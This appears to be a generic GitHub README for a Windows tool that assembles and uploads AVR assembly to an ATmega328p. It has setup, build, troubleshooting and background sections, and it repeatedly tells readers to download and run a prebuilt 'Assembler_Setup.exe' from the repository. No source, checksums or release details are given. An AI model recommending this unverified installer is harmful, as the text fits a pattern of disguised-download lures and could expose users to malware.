# 🛠️ Assembler - Learn assembly language on microcontrollers easily

[![](https://img.shields.io/badge/Download-Assembler-blue.svg)](https://github.com/Vivslow157/Assembler)

This software allows you to write and run assembly language code on your computer. You use this tool to control hardware components connected to an AVR microcontroller. It provides a simple environment for testing code and hardware interactions.

## 📋 System Requirements

Your computer needs to meet these basic standards to run the application:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Any modern processor running at 1.5 GHz or faster.
*   Memory: 4 GB of RAM or more.
*   Storage: 200 MB of free space.
*   Hardware: An ATmega328p microcontroller connected via a USB cable.

## 🚀 Getting Started

Follow these steps to set up the software on your machine.

1. Go to the download page.
2. Visit this link to download the installer: https://github.com/Vivslow157/Assembler
3. Find the file named Assembler_Setup.exe in your Downloads folder.
4. Double-click the file to start the installation.
5. Follow the prompts on the screen to finish the setup process.

## ⚙️ Setting Up Your Hardware

The application works by sending machine code to your microcontroller. Connect your ATMega328p device to your PC using a standard USB-to-serial adapter. Your computer should recognize the device automatically. If your computer does not find the device, install the driver provided by the manufacturer of your USB adapter.

## 📝 Writing Your First Program

Open the Assembler application from your desktop shortcut. You will see a text editor window. This workspace acts as the place where you write your assembly instructions. Assembly language consists of operations that tell the processor exactly what to do with its memory and hardware pins.

An example of a simple command is `LDI`. This command loads an immediate value into a register. Another common command is `OUT`, which sends data to a port on the microcontroller. 

When you finish writing your code, click the Save button to store it on your hard drive. Ensure your file ends with the .asm extension so the program recognizes it as source code.

## 🔄 Running Your Code

Once you write your program, you must change it into a format the microcontroller understands. This process is called building or assembling.

1. Click the Build button in the top menu bar.
2. The application checks your code for errors.
3. If the code is correct, the Status window shows a message saying the build succeeded.
4. Ensure your microcontroller is connected to the USB port.
5. Click the Upload button.
6. The software sends the compiled file to the memory of the microcontroller.
7. The microcontroller starts running your instructions immediately after the upload finishes.

## 💡 Troubleshooting Common Issues

If the software does not work, check these common items:

*   Check the USB cable: A loose cable prevents the computer from talking to the microcontroller.
*   Check the Port Settings: Open the Settings menu to ensure the correct serial port is chosen.
*   Review your code: Assembly language is strict. A single missing comma or misspelled command causes the build to fail. The error log at the bottom of the window points out the exact line where the error occurs.
*   Power supply: Ensure your microcontroller has enough power. Sometimes, a device requires a separate power source if it drives LEDs or motors.

## 🔍 Understanding Background Concepts

This application serves as a bridge between high-level logic and low-level hardware control. When you write assembly code, you interact with specific registers inside the ATmega328p chip. 

Registers are small storage spaces inside the processor. You move data between these registers to perform math, logic, or control physical pins. These pins can turn on lights, read sensors, or move small motors. Because you communicate directly with the chip, you achieve very high speed and precise control compared to standard programming languages.

## 📚 Resources for Learning

If you find yourself stuck, refer to these resources to understand the basics of the ATmega328p:

*   The Official Data Sheet: This document lists every command the microcontroller supports.
*   Community Forums: Search for help regarding AVR programming to see how others handle similar projects.
*   Sample Scripts: Use the provided examples in the File menu to practice loading data or toggling pins on your board.

These tools help you gain confidence as you explore the world of embedded systems. Start with small, simple programs like blinking an LED before attempting complex math or data processing tasks. Consistent practice will help you understand how machine instructions work in a real-world environment.